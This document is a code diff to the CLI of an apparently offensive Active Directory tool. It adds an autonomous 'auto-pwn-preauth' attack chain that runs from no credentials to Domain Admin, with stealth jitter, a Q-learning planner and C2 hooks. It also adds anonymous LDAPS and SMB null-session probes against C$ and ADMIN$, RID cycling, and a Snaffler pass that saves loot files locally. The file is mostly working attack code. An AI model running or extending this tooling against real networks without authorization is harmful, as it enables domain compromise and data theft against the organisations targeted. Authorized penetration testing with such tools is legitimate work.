@@ -23,6 +23,7 @@ use tracing_subscriber::{EnvFilter, fmt};
 use overthrone_core::c2::C2Manager;
 use overthrone_core::graph::AttackGraph;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
+use overthrone_core::exec::modules as ovt_modules;
 use std::collections::HashMap;
 use std::sync::{Arc, RwLock};
 
@@ -41,6 +42,7 @@ use std::sync::{Arc, RwLock};
 struct Cli {
     #[command(subcommand)]
     command: Box<Commands>,
+
 
     #[arg(
         short = 'H',
@@ -102,6 +104,28 @@ enum OutputFormat {
     Text,
     Json,
     Csv,
+}
+
+// ──────────────────────────────────────────────────────────
+// Module subcommands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum ModuleAction {
+    /// List registered modules
+    List,
+
+    /// Run a module against a target
+    Run {
+        /// Module name
+        name: String,
+        /// Target host
+        #[arg(short, long)]
+        target: String,
+        /// Optional JSON parameters for the module
+        #[arg(long)]
+        params: Option<String>,
+    },
 }
 
 #[derive(Subcommand)]
@@ -196,6 +220,50 @@ enum Commands {
     /// Autonomous attack chain — full killchain from enum to DA
     #[command(name = "auto-pwn", alias = "auto", alias = "autopwn")]
     AutoPwn {
+        /// Goal: "Domain Admins", "ntds", "recon", hostname, or user
+        #[arg(short, long, default_value = "Domain Admins")]
+        target: String,
+        /// Preferred remote execution method
+        #[arg(short, long, value_enum, default_value = "auto")]
+        method: ExecMethod,
+        /// Stealth mode — low-noise actions, extra jitter
+        #[arg(long, default_value = "false")]
+        stealth: bool,
+        /// Dry run — plan and display, no execution
+        #[arg(long, default_value = "false")]
+        dry_run: bool,
+        /// Maximum stage to reach (enumerate, attack, escalate, lateral, loot, cleanup)
+        #[arg(long, value_enum, default_value = "loot")]
+        max_stage: MaxStageArg,
+        /// Adaptive engine mode: heuristic, qlearning, or hybrid (default)
+        #[arg(long, value_enum, default_value = "hybrid")]
+        adaptive: AdaptiveModeArg,
+        /// Path to persist Q-table across engagements
+        #[arg(long, default_value = "q_table.json")]
+        q_table: String,
+        /// Jitter between steps (milliseconds)
+        #[arg(long, default_value = "1000")]
+        jitter_ms: u64,
+        /// Use LDAPS (port 636)
+        #[arg(long)]
+        ldaps: bool,
+        /// Per-step timeout (seconds)
+        #[arg(long, default_value = "30")]
+        timeout: u64,
+        /// Run a named playbook instead of goal-driven planning
+        #[arg(long, value_enum)]
+        playbook: Option<PlaybookArg>,
+        /// TOML config file to load targets/credentials/options from
+        #[arg(short = 'C', long, value_name = "FILE")]
+        config: Option<String>,
+        /// Resume a previously saved session file
+        #[arg(long, value_name = "SESSION_FILE")]
+        resume: Option<String>,
+    },
+
+    /// Autonomous attack chain starting from no credentials (pre-auth enum + loot bootstrap)
+    #[command(name = "auto-pwn-preauth", alias = "autopwn-preauth", alias = "auto-preauth")]
+    AutoPwnPreauth {
         /// Goal: "Domain Admins", "ntds", "recon", hostname, or user
         #[arg(short, long, default_value = "Domain Admins")]
         target: String,
@@ -431,6 +499,12 @@ enum Commands {
     Plugin {
         #[clap(subcommand)]
         action: PluginAction,
+    },
+
+    /// Module management — list and run registered built-in modules
+    Module {
+        #[command(subcommand)]
+        action: ModuleAction,
     },
 
     // ─── NEW: C2 Integration ─────────────────────────────────
@@ -1653,6 +1727,12 @@ async fn async_main() {
 
     banner::print_banner();
 
+    // Register builtin execution modules (winrm, smb-exec, psexec, ...)
+    // This ensures `ovt module list` returns available modules.
+    if let Err(e) = tokio::runtime::Handle::current().block_on(async { ovt_modules::register_builtin_modules().await; Ok::<(), ()>(()) }) {
+        eprintln!("warn: failed to register builtin modules: {:?}", e);
+    }
+
     let exit_code = match *cli.command {
         Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
             Ok(_) => 0,
@@ -1721,6 +1801,43 @@ async fn async_main() {
                     playbook,
                     config: config.clone(),
                     resume: resume.clone(),
+                    bootstrap_no_creds: false,
+                },
+            )
+            .await
+        }
+        Commands::AutoPwnPreauth {
+            ref target,
+            ref method,
+            stealth,
+            dry_run,
+            max_stage,
+            adaptive,
+            ref q_table,
+            jitter_ms,
+            ldaps,
+            timeout,
+            playbook,
+            ref config,
+            ref resume,
+        } => {
+            cmd_autopwn(
+                &cli,
+                AutoPwnArgs {
+                    target: target.clone(),
+                    method: method.clone(),
+                    stealth,
+                    dry_run,
+                    max_stage,
+                    adaptive,
+                    q_table: q_table.clone(),
+                    jitter_ms,
+                    ldaps,
+                    timeout,
+                    playbook,
+                    config: config.clone(),
+                    resume: resume.clone(),
+                    bootstrap_no_creds: true,
                 },
             )
             .await
@@ -1809,6 +1926,14 @@ async fn async_main() {
             let ctx = make_plugin_context(&cli);
             commands_impl::cmd_plugin(&cli, &mut plugin_registry, &ctx, action.clone()).await
         }
+
+        // ─── Module handler ──────────────────────────────────
+        Commands::Module { ref action } => match action {
+            ModuleAction::List => commands_impl::cmd_module_list(&cli).await,
+            ModuleAction::Run { name, target, params } => {
+                commands_impl::cmd_module_run(&cli, name.clone(), target.clone(), params.clone()).await
+            }
+        },
 
         // ─── NEW: C2 handler ─────────────────────────────────
         Commands::C2 { ref action } => {
@@ -2758,12 +2883,16 @@ async fn cmd_pre_enum(cli: &Cli, target: EnumTarget) -> i32 {
                 "Running no-credential AD service triage...".bright_black()
             );
             let mut ldap_open = false;
+            let mut ldaps_open = false;
+            let mut smb_open = false;
             match overthrone_core::scan::quick_scan(&dc).await {
                 Ok(mut results) => {
                     results.sort_by_key(|result| result.port);
                     for result in &results {
                         let status = if result.open {
                             ldap_open |= result.port == 389;
+                            ldaps_open |= result.port == 636;
+                            smb_open |= result.port == 445;
                             "open".green()
                         } else {
                             "closed".bright_black()
@@ -2787,6 +2916,26 @@ async fn cmd_pre_enum(cli: &Cli, target: EnumTarget) -> i32 {
                 let _ = anonymous_ldap_probe(&dc).await;
             } else {
                 banner::print_info("LDAP/389 is not open; skipping anonymous RootDSE probe.");
+            }
+
+            if ldaps_open {
+                let _ = anonymous_ldaps_probe(&dc).await;
+            } else {
+                banner::print_info("LDAPS/636 is not open; skipping anonymous LDAPS probe.");
+            }
+
+            if smb_open {
+                let _ = smb_null_probe(&dc).await;
+            } else {
+                banner::print_info("SMB/445 is not open; skipping null-session SMB probe.");
+            }
+
+            if overthrone_core::proto::rid::tooling_available() {
+                banner::print_info("RID tooling check: rpcclient/net-rpc path is available.");
+            } else {
+                banner::print_warn(
+                    "RID tooling check: rpcclient/net-rpc not found. Install samba-common-bin (Kali/Linux).",
+                );
             }
 
             banner::print_success("Pre-enum triage completed");
@@ -2877,6 +3026,195 @@ async fn anonymous_ldap_probe(dc: &str) -> std::result::Result<bool, String> {
 
     let _ = ldap.unbind().await;
     Ok(true)
+}
+
+async fn anonymous_ldaps_probe(dc: &str) -> std::result::Result<bool, String> {
+    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};
+
+    let url = format!("ldaps://{}:636", dc);
+    let settings = LdapConnSettings::new()
+        .set_conn_timeout(std::time::Duration::from_secs(5))
+        .set_no_tls_verify(true);
+    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
+        .await
+        .map_err(|e| format!("connect to {url} failed: {e}"))?;
+    drive!(conn);
+
+    let bind = ldap
+        .simple_bind("", "")
+        .await
+        .map_err(|e| format!("anonymous LDAPS bind request failed: {e}"))?;
+    if bind.rc != 0 {
+        banner::print_info(&format!(
+            "Anonymous LDAPS bind rejected by {} (rc={} {}).",
+            dc,
+            bind.rc,
+            ldap_result_label(bind.rc)
+        ));
+        let _ = ldap.unbind().await;
+        return Ok(false);
+    }
+
+    banner::print_success(&format!("Anonymous LDAPS bind allowed on {}", dc));
+    let attrs = vec![
+        "defaultNamingContext",
+        "configurationNamingContext",
+        "rootDomainNamingContext",
+        "dnsHostName",
+        "ldapServiceName",
+        "supportedLDAPVersion",
+    ];
+    let (entries, _) = ldap
+        .search("", Scope::Base, "(objectClass=*)", attrs)
+        .await
+        .map_err(|e| format!("LDAPS RootDSE search failed: {e}"))?
+        .success()
+        .map_err(|e| format!("LDAPS RootDSE search rejected: {e}"))?;
+
+    for entry in entries {
+        let entry = SearchEntry::construct(entry);
+        println!("  {}", "RootDSE over LDAPS".bright_black());
+        for attr in [
+            "defaultNamingContext",
+            "configurationNamingContext",
+            "rootDomainNamingContext",
+            "dnsHostName",
+            "ldapServiceName",
+            "supportedLDAPVersion",
+        ] {
+            if let Some(values) = entry.attrs.get(attr) {
+                println!("    {:<35} {}", attr, values.join(", "));
+            }
+        }
+    }
+
+    let _ = ldap.unbind().await;
+    Ok(true)
+}
+
+async fn smb_null_probe(dc: &str) -> std::result::Result<bool, String> {
+    let session = overthrone_core::proto::smb::SmbSession::connect(dc, "", "", "")
+        .await
+        .map_err(|e| format!("SMB null session connect failed: {e}"))?;
+
+    let checks = session
+        .check_share_access(&["IPC$", "NETLOGON", "SYSVOL", "C$", "ADMIN$"])
+        .await;
+
+    let readable: Vec<String> = checks
+        .iter()
+        .filter(|r| r.readable)
+        .map(|r| r.share_name.clone())
+        .collect();
+
+    banner::print_success(&format!(
+        "SMB null session allowed on {} (readable shares: {})",
+        dc,
+        if readable.is_empty() {
+            "none".to_string()
+        } else {
+            readable.join(", ")
+        }
+    ));
+    Ok(!readable.is_empty())
+}
+
+async fn discover_domain_from_rootdse(dc: &str) -> Option<String> {
+    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};
+
+    let url = format!("ldap://{}:389", dc);
+    let settings = LdapConnSettings::new().set_conn_timeout(std::time::Duration::from_secs(4));
+    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url).await.ok()?;
+    drive!(conn);
+
+    let bind = ldap.simple_bind("", "").await.ok()?;
+    if bind.rc != 0 {
+        let _ = ldap.unbind().await;
+        return None;
+    }
+
+    let (entries, _) = ldap
+        .search(
+            "",
+            Scope::Base,
+            "(objectClass=*)",
+            vec!["defaultNamingContext"],
+        )
+        .await
+        .ok()?
+        .success()
+        .ok()?;
+
+    let domain = entries.into_iter().find_map(|entry| {
+        let se = SearchEntry::construct(entry);
+        se.attrs
+            .get("defaultNamingContext")
+            .and_then(|values| values.first())
+            .map(|dn| {
+                dn.split(',')
+                    .filter_map(|part| part.trim().strip_prefix("DC="))
+                    .collect::<Vec<_>>()
+                    .join(".")
+            })
+            .filter(|domain| !domain.is_empty())
+    });
+
+    let _ = ldap.unbind().await;
+    domain
+}
+
+async fn run_preauth_snaffler(dc: &str, domain: &str) {
+    banner::print_module_banner("PREAUTH LOOT");
+    let normalized_domain = domain.trim().to_string();
+    if normalized_domain.is_empty() {
+        banner::print_warn(
+            "Domain is unknown; running anonymous Snaffler bootstrap with empty domain context.",
+        );
+    }
+
+    let config = ReaperConfig {
+        dc_ip: dc.to_string(),
+        domain: normalized_domain.clone(),
+        base_dn: if normalized_domain.is_empty() {
+            String::new()
+        } else {
+            ReaperConfig::base_dn_from_domain(&normalized_domain)
+        },
+        username: String::new(),
+        password: Some(String::new()),
+        nt_hash: None,
+        modules: vec!["snaffler".to_string()],
+        page_size: 500,
+    };
+
+    match overthrone_reaper::snaffler::run_snaffler(&config).await {
+        Ok(findings) => {
+            if findings.is_empty() {
+                banner::print_info("Pre-auth loot pass found no interesting files.");
+            } else {
+                banner::print_success(&format!(
+                    "Pre-auth loot pass found {} interesting files",
+                    findings.len()
+                ));
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let summary_path = loot_dir.join("preauth_snaffler_findings.json");
+                if let Ok(json) = serde_json::to_string_pretty(&findings) {
+                    let _ = std::fs::write(&summary_path, json);
+                    banner::print_info(&format!(
+                        "Pre-auth findings saved to {}",
+                        summary_path.display()
+                    ));
+                }
+            }
+        }
+        Err(e) => {
+            banner::print_warn(&format!(
+                "Pre-auth loot pass failed (continuing autopwn): {}",
+                e
+            ));
+        }
+    }
 }
 
 fn ad_port_label(port: u16) -> &'static str {
@@ -4197,6 +4535,7 @@ struct AutoPwnArgs {
     playbook: Option<PlaybookArg>,
     config: Option<String>,
     resume: Option<String>,
+    bootstrap_no_creds: bool,
 }
 
 // cmd_autopwn — wired to overthrone-pilot runner with Q-learning
@@ -4215,6 +4554,7 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         playbook,
         ref config,
         ref resume,
+        bootstrap_no_creds,
     } = args;
     banner::print_module_banner("AUTONOMOUS ATTACK");
 
@@ -4227,13 +4567,38 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         }
     };
 
-    let creds_cli = match require_creds(cli) {
-        Ok(c) => c,
-        Err(e) => return e,
-    };
     let dc = match require_dc(cli) {
         Ok(d) => d,
         Err(e) => return e,
+    };
+
+    let discovered_domain = if bootstrap_no_creds {
+        if let Some(domain) = cli.domain.clone() {
+            Some(domain)
+        } else {
+            discover_domain_from_rootdse(&dc).await
+        }
+    } else {
+        None
+    };
+
+    let creds_cli = if bootstrap_no_creds {
+        if let Some(domain) = discovered_domain.as_deref() {
+            banner::print_info(&format!(
+                "No-credential bootstrap mode enabled (domain: {})",
+                domain
+            ));
+        } else {
+            banner::print_warn(
+                "No-credential bootstrap mode enabled, but domain could not be auto-discovered. Continuing with pre-auth-only methods.",
+            );
+        }
+        None
+    } else {
+        Some(match require_creds(cli) {
+            Ok(c) => c,
+            Err(e) => return e,
+        })
     };
 
     // Map CLI exec method to pilot ExecMethod
@@ -4256,19 +4621,29 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
     };
 
     // Build pilot credentials
-    let pilot_creds = if let Some(hash) = creds_cli.nthash() {
-        overthrone_pilot::runner::Credentials::ntlm_hash(
-            &creds_cli.domain,
-            &creds_cli.username,
-            hash,
-        )
+    let pilot_creds = if let Some(creds) = creds_cli.as_ref() {
+        if let Some(hash) = creds.nthash() {
+            overthrone_pilot::runner::Credentials::ntlm_hash(&creds.domain, &creds.username, hash)
+        } else {
+            overthrone_pilot::runner::Credentials::password(
+                &creds.domain,
+                &creds.username,
+                creds.password().unwrap_or(""),
+            )
+        }
     } else {
-        overthrone_pilot::runner::Credentials::password(
-            &creds_cli.domain,
-            &creds_cli.username,
-            creds_cli.password().unwrap_or(""),
-        )
+        let domain = discovered_domain.clone().unwrap_or_default();
+        overthrone_pilot::runner::Credentials::password(&domain, "", "")
     };
+
+    if bootstrap_no_creds {
+        let _ = cmd_pre_enum(cli, EnumTarget::Pre).await;
+        let _ = cmd_pre_enum(cli, EnumTarget::Anonymous).await;
+        let _ = commands_impl::cmd_rid(cli, 500, 2000, true).await;
+        let preauth_domain = pilot_creds.domain.clone();
+        run_preauth_snaffler(&dc, &preauth_domain).await;
+    }
+    let pilot_domain_display = pilot_creds.domain.clone();
 
     // ── Session Resume ──
     let initial_state = if let Some(session_path) = resume.as_deref() {
@@ -4311,6 +4686,13 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
 
     println!("{} Target:    {}", "🎯".bright_black(), target.cyan());
     println!("{} DC:        {}", "🏰".bright_black(), dc.cyan());
+    if !pilot_domain_display.is_empty() {
+        println!(
+            "{} Domain:    {}",
+            "🌐".bright_black(),
+            pilot_domain_display.cyan()
+        );
+    }
     println!("{} Method:    {:?}", "🔧".bright_black(), method);
     println!("{} Max Stage: {:?}", "📊".bright_black(), max_stage);
     println!("{} Adaptive:  {:?}", "🧠".bright_black(), adaptive);
